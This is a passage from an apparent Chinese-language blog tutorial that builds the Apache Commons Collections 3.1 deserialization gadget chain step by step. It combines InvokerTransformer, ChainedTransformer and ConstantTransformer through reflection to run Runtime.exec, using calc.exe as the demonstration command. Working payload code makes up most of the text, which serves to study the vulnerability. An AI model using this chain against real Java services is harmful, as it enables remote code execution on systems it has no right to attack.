class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//模拟攻击</span></span><br><span class="line">    <span class="comment">//1.客户端构造序列化payload，使用写入文件模拟发包攻击</span></span><br><span class="line">    InvokerTransformer a = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">            <span class="string">"exec"</span>,</span><br><span class="line">            <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">            <span class="keyword">new</span> String[]&#123;<span class="string">"calc.exe"</span>&#125;);</span><br><span class="line">        </span><br><span class="line">    FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">    ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">    fout.writeObject(a);</span><br><span class="line">    <span class="comment">//2.服务端从文件中读取payload模拟接受包，然后触发漏洞</span></span><br><span class="line">    <span class="comment">//服务端反序列化payload读取</span></span><br><span class="line">        FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line">    <span class="comment">//神奇第一处：服务端需要自主构造恶意input</span></span><br><span class="line">        Object input=Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>));</span><br><span class="line">    <span class="comment">//神奇第二处：服务端需要将客户端输入反序列化成InvokerTransformer格式，并在服务端自主传入恶意参数input</span></span><br><span class="line">        InvokerTransformer a_in = (InvokerTransformer) fin.readObject();</span><br><span class="line">        a_in.transform(input);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们会发现如果我们要直接利用这个反射机制作为漏洞的话，需要服务端的开发人员：</p><ol><li>帮我们写一个payload作为input；</li><li>接受客户端输入参数，反序列化成InvokerTransformer类</li><li>再刻意调用InvokerTransformer类的transform函数</li></ol><p>实际上…..只有开发人员是自己人的情况下才满足条件吧……<br>所以我们面临一些问题：</p><ol><li>payload肯定需要在客户端可以自定义构造，再传输进入服务端</li><li>服务端需要把我们的输入exp反序列化成一个在代码中可能使用到的类</li><li>并且在代码正常操作中会调用这个类中的一个可触发漏洞地函数（当然这个函数最后会进入我们InvokerTransformer类的transform函数，从而形成命令执行）</li><li>如果这个反序列化的类和这个类触发命令执行的方法可以在一个readObject复写函数中恰好触发，就对于服务端上下文语句没有要求了！</li></ol><blockquote><p>这边假如像预期这样，是对服务端上下文没有要求，因为只要执行readObject就肯定会命令执行，不需要其他上下文条件。<br>但是对于服务端版本环境是有要求的，之后会说到</p></blockquote><p>那么我们一个个来解决问题：首先使客户端自定义paylaod！</p><h3 id="第二步-ChainedTransformer"><a href="#第二步-ChainedTransformer" class="headerlink" title="第二步 ChainedTransformer"></a>第二步 ChainedTransformer</h3><p>下面我们需要关注<strong>ChainedTransformer</strong>这个类,首先看一下这个类的描述：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Transformer implementation that chains the specified transformers together.</span></span><br><span class="line"><span class="comment">* &lt;p&gt;</span></span><br><span class="line"><span class="comment">* The input object is passed to the first transformer. The transformed result</span></span><br><span class="line"><span class="comment">* is passed to the second transformer and so on.</span></span><br><span class="line"><span class="comment">* </span></span><br><span class="line"><span class="comment">将指定的转换器连接在一起的转化器实现。</span></span><br><span class="line"><span class="comment">输入的对象将被传递到第一个转化器，转换结果将会输入到第二个转化器，并以此类推</span></span><br></pre></td></tr></table></figure></p><p>可以知道他会把我们的Transformer变成一个串，再逐一执行，其中这个操作对应的就是<strong>ChainedTransformer</strong>类的<code>transform</code>函数<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Transforms the input to result via each decorated transformer</span></span><br><span class="line"><span class="comment">    * </span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> object  the input object passed to the first transformer</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> the transformed result</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里会遍历iTransformers数组，依次调用这个数组中每一个Transformer的transform，并串行传递执行结果。</p><p>首先确定iTransformers可控，<strong>iTransformers数组</strong>是通过<strong>ChainedTransformer</strong>类的构造函数赋值的：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Constructor that performs no validation.</span></span><br><span class="line"><span class="comment"> * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> transformers  the transformers to chain, not copied, no nulls</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>();<span class="comment">//这个super不清楚做了啥，</span></span><br><span class="line">    iTransformers = transformers;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>那么我们知道可以自定义iTransformers的内容，我们已有条件如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//最终执行目标</span></span><br><span class="line">Class.forName(<span class="string">"java.lang.Runtime"</span>)</span><br><span class="line">.getMethod(<span class="string">"exec"</span>, String.class)</span><br><span class="line">.invoke(</span><br><span class="line">Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>))<span class="comment">//此处在获取实例</span></span><br><span class="line">,</span><br><span class="line"><span class="string">"calc.exe"</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">//InvokeTransformer关键语句：</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    Class cls = input.getClass();</span><br><span class="line">    Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">    <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>再看到InvokeTransformer代码我们需要<strong>引出一个注意点</strong>：</p><blockquote><p>这里我们需要注意到<code>input.getClass()</code>这个方法使用上的一些区别：</p><ul><li>当input是一个类的实例对象时，获取到的是这个类</li><li>当input是一个类时，获取到的是java.lang.Class</li></ul><p>可以使用如下代码验证，这里不再赘述</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Object a = Runtime.getRuntime();</span><br><span class="line">Class b = Runtime.class;</span><br><span class="line">System.out.println(a.getClass());</span><br><span class="line">System.out.println(b.getClass());</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果</span></span><br><span class="line"><span class="comment">//class java.lang.Runtime</span></span><br><span class="line"><span class="comment">//class java.lang.Class</span></span><br></pre></td></tr></table></figure><p>基于之前写的代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//只调用InvokeTransformer的情况如下：</span></span><br><span class="line">    InvokerTransformer a = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                <span class="string">"exec"</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> String[]&#123;<span class="string">"calc.exe"</span>&#125;);</span><br><span class="line"></span><br><span class="line">    Object input=Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>));</span><br></pre></td></tr></table></figure></p><p>我们也可以知道input的为Runtime类的对象，所以cls就是Runtime类，所以cls.getMethod可以找到exec方法，直接进行调用。</p><p>先把a封装成ChainedTransformer格式，但是payload还是在外面<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//客户端构造payload</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> String[]&#123;<span class="string">"calc.exe"</span>&#125;);</span><br><span class="line">&#125;</span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line"><span class="comment">//服务端触发所需内容</span></span><br><span class="line">Object input=Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>));</span><br><span class="line">transformerChain.transform(input);<span class="comment">//此处必须为input，作为第一个输入</span></span><br></pre></td></tr></table></figure></p><p>把payload放入Transformer数组中，需要转化成特定的Transformer格式才行。</p><h4 id="第二点五步-ConstantTransformer-gt-Runtime实例序列化"><a href="#第二点五步-ConstantTransformer-gt-Runtime实例序列化" class="headerlink" title="第二点五步 ConstantTransformer -&gt; Runtime实例序列化"></a>第二点五步 ConstantTransformer -&gt; Runtime实例序列化</h4><p>我们找到<code>ConstantTransformer</code>类跟<code>InvokkerTransformer</code>一样继承<code>Transforme</code>父类，可以进入数组<br>顾名思义ConstantTransformer类其实就只会存放一个常量；它的构造函数会写入这个变量，他的transform函数会返回这个变量。<br>把Runtime实例写入这个变量：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">    <span class="comment">//以下两个语句等同,一个是通过反射机制得到，一个是直接调用得到Runtime实例</span></span><br><span class="line">    <span class="comment">// new ConstantTransformer(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))),</span></span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"calc.exe"</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">transformerChain.transform(<span class="keyword">null</span>);<span class="comment">//此处输入可以为任意值，因为不会被使用到，相当于初始第一个输入为我们设置的常量</span></span><br></pre></td></tr></table></figure></p><p>以上代码可以成功弹框执行！那么我们模拟一下序列化与反序列化过程！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//客户端构造payload</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>))),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"calc.exe"</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"><span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">fout.writeObject(transformerChain);</span><br><span class="line"></span><br><span class="line"><span class="comment">//服务端反序列化payload读取</span></span><br><span class="line">FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line"><span class="comment">//服务端反序列化成ChainedTransformer格式，并在服务端自主传入恶意参数input</span></span><br><span class="line">Transformer transformerChain_now = (ChainedTransformer) fin.readObject();</span><br><span class="line">transformerChain_now.transform(<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure><p>但是很遗憾的告诉以为快要成功的你，成功的本地测试加上序列化、反序列化过程之后就会失败。<br>因为Runtime类的定义没有继承<code>Serializable</code>类，所以是不支持反序列化的。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g78azny32mj313q0emq79.jpg" alt="Runtime实例-序列化报错.jpg"></p><p>那么我们在payload写入Runtime实例的计划就泡汤了。</p><h4 id="第二点八步-在服务端生成Runtime实例"><a href="#第二点八步-在服务端生成Runtime实例" class="headerlink" title="第二点八步 在服务端生成Runtime实例"></a>第二点八步 在服务端生成Runtime实例</h4><p>既然我们没法在客户端序列化写入Runtime的实例，那就让服务端执行我们的命令生成一个Runtime实例呗？<br>我们知道Runtime的实例是通过<code>Runtime.getRuntime()</code>来获取的，而<code>InvokerTransformer</code>里面的反射机制可以执行任意函数。<br>同时，我们已经成功执行过Runtime类里面的exec函数。讲道理肯定是没问题的.</p><p>我们先看getRuntiime方法的参数<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Runtime <span class="title">getRuntime</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> currentRuntime;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>没有参数，那就非常简单了<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.class),<span class="comment">//得到Runtime class</span></span><br><span class="line">        <span class="comment">//由于InvokerTransformer的构造函数要求传入Class类型的参数类型，和Object类型的参数数值，所以封装一下，下面也一样</span></span><br><span class="line">        <span class="comment">//上面传入Runtime.class，调用Runtime class的getRuntime方法（由于是一个静态方法，invoke调用静态方法，传入类即可）</span></span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"getRuntime"</span>,<span class="keyword">new</span> Class[]&#123;&#125;,<span class="keyword">new</span> Object[]&#123;&#125;),</span><br><span class="line">        <span class="comment">//上面Runtime.getRuntime()得到了实例，作为这边的输入(invoke调用普通方法，需要传入类的实例)     </span></span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"calc.exe"</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">transformerChain.transform(<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure></p><blockquote><p>在这里，之前自己陷入了一个很傻逼的问题，即：InvokerTransformer类transform方法中return method.invoke()这个语句<br>invoke()调用到底return了啥?<br>因为在这里形成了一个调用return的结果，再调用的链。为什么就可以上一个输出作为下一个输入时，可以成功调用了呢？<br>一开始以为invoke会统一返回一个对象作为下一个输入什么的，并且在调试的时候每次invoke的结果都不一样，源码看的头晕。<br>实际上是钻了死胡同：invoke的return是根据被调用的函数return啥，invoke就return啥。<br>就好比我invoke一个我自定义的方法a，在a中，我return了字符串”1”。那么就是invoke的结果就是字符串”1”。<br>看以上的过程就是第一次Runtime.getRuntime()的结果输入了下一个InvokerTransformer</p></blockquote><p>以上感觉是万事大吉了！但是实际上并不是…</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g78azt7nmjj31tp0a3di9.jpg" alt="getClass理解错误-报错.jpg"></p><p>回想之前对于InvokerTransformer中<code>Class cls = input.getClass();</code>的解释</p><blockquote><p>这里我们需要注意到<code>input.getClass()</code>这个方法使用上的一些区别：</p><ul><li>当input是一个类的实例对象时，获取到的是这个类</li><li>当input是一个类时，获取到的是java.lang.Class</li></ul></blockquote><p>我们来推演第一次InvokerTransformer的反射调用，即得到Runtime类对象的getRuntime方法调用:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//InvokeTransformer关键语句：</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;<span class="comment">//input为我们设置的常量Runtime.class</span></span><br><span class="line">        Class cls = input.getClass();<span class="comment">//！！！这里由于input是一个类，会得到java.lang.Class</span></span><br><span class="line">        <span class="comment">//在java.lang.Class类中去寻找getRuntime方法企图得到Runtime类对象，此处报错！！</span></span><br><span class="line">        Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>那么我们好像陷入了一个死胡同：<br>得到Runtime类实例才能调用exec方法。<br>而得到Runtime类实例作为input，才能得到Runtime class，才能找到getRuntime方法，得到Runtime类实例………</p><p>…………………非常的尴尬…………………..</p><h4 id="第二点九步-还是反射机制"><a href="#第二点九步-还是反射机制" class="headerlink" title="第二点九步 还是反射机制"></a>第二点九步 还是反射机制</h4><p>那么我们通过直接调用Runtime.getRuntime方法好像是行不通了,有没有其他方法呢？</p><p><strong>还是反射机制</strong></p><p>已知：</p><ol><li>我们开头不能获得<code>Class.forName(&quot;java.lang.Runtime&quot;)</code>，只能得到<code>Class.forName(&quot;java.lang.Class&quot;)</code></li><li>我们可以有任意的反射机制<br>求：</li><li>我们要获取到Runtime.getRunime函数，并执行它。<br>解：</li><li>通过反射机制获取反射机制中的getMethod类，由于getMethod类是存在Class类中，就符合开头Class类的限制</li><li>通过getMethod函数获取Runtime类中的getRuntime函数<ul><li>在哪个类中调用getMethod去获取方法，实际上是由invoke函数里面的的第一个参数obj决定的</li></ul></li><li>再通过反射机制获取反射机制中的invoke类，执行上面获取的getRuntime函数</li><li>invoke调用getRuntime函数，获取Runtime类的实例<ul><li>这里在使用反射机制调用getRuntime静态类时，invoke里面第一个参数obj其实可以任意改为null，或者其他类，而不一定要是Runtime类</li></ul></li></ol><blockquote><p>具体变化细节，我选择把它放在反射机制一文中说明，这边给出结果。</p></blockquote><p>我们的最终目的是执行<br><code>Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;)</code></p><p>先来获取getRuntime类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//目标语句</span></span><br><span class="line">Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>)</span><br><span class="line"><span class="comment">//使用java.lang.Class开头</span></span><br><span class="line">Class.forName(<span class="string">"java.lang.Class"</span>).getMethod(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;)</span><br><span class="line">        .invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>),<span class="string">"getRuntime"</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]);</span><br><span class="line">        <span class="comment">//invoke函数的第一个参数是Runtime类，我们需要在Runtime类中去执行getMethod，获取getRuntime参数</span></span><br></pre></td></tr></table></figure></p><p>对照着InvokerTransformer类转变为transformers格式<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class cls = input.getClass();<span class="comment">//cls = java.lang.Class</span></span><br><span class="line">Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes); <span class="comment">//getMethod方法</span></span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs); <span class="comment">//在Runtime中找getRuntime方法，并返回这个方法</span></span><br></pre></td></tr></table></figure></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">       <span class="comment">//还需要填充 调用getRuntime得到Runtime实例,</span></span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"calc.exe"</span>&#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>还差执行获取到的getRuntime，下一个input是上一个执行接口，继续对照<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//input=getRuntime这个方法</span></span><br><span class="line">Class cls = input.getClass();<span class="comment">//cls = java.lang.Method（getRuntime方法是method类）</span></span><br><span class="line">Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes); <span class="comment">//在method类中找到invoke方法，method=invoke方法</span></span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs); <span class="comment">//调用invoke方法，input=getRuntime这个方法，传入自定义的参数</span></span><br></pre></td></tr></table></figure></p><p>以上最后一步有点复杂，method就是invoke方法，相当于使用invoke调用了invoke函数。<br>首先this.iMethodName, this.iParamTypes是根据invoke接口而定的：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object obj, Object... args)</span></span></span><br><span class="line"><span class="function"><span class="comment">//this.iMethodName="invoke"</span></span></span><br><span class="line"><span class="function"><span class="comment">//this.iParamTypes=new Class[] &#123;Object.class, Object[].class &#125;</span></span></span><br><span class="line"><span class="function"><span class="comment">//外面class、Object封装是InvokerTransformer类的构造函数要求</span></span></span><br></pre></td></tr></table></figure></p><p>按照invoke中的input才是它要调用的环境的准则。<br><code>invoke方法.invoke(input, this.iArgs)</code>实际上等于<code>input.invoke(this.iArgs)</code>，<br>而input=getRuntime方法，那么只要填入<code>this.iArgs</code>就好了</p><p>又由于getRuntime是个静态函数，不用太纠结输入obj，写作null。getRuntime方法不需要参数。<br><code>this.iArgs=null,new Object[0]</code></p><p>那么整合就如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"calc.exe"</span>&#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>以上代码其实就是等同于<br><code>((Runtime)Runtime.class.getMethod(&quot;getMethod&quot;,null).invoke(null,null)).exec(&quot;calc.exe&quot;);</code><br>我们笼统的来理解，实际就是如下（这里偷一张<a href="http://blog.orleven.com/2017/11/11/java-deserialize/" target="_blank" rel="noopener">orleven</a>的图）：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g78b00yk3zj30xg0bkmyn.jpg" alt="映射关系.png"></p><p>总体上来说：利用了反射机制调用反射机制的函数，绕过了开头cls只能为java.lang.Class的限制，根据具体环境input环环相扣，特么竟然恰好就通了<br>….非常的微妙….</p><h3 id="第三步-TransformedMap"><a href="#第三步-TransformedMap" class="headerlink" title="第三步 TransformedMap"></a>第三步 TransformedMap</h3><p>那么我们在第二步通过ConstantTransformer、ChainedTransformer就完成了<strong>payload在客户端自定义</strong>这一目标，我们看一下目前的攻击流程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">commons_collections_3_1</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1.客户端构建攻击代码</span></span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        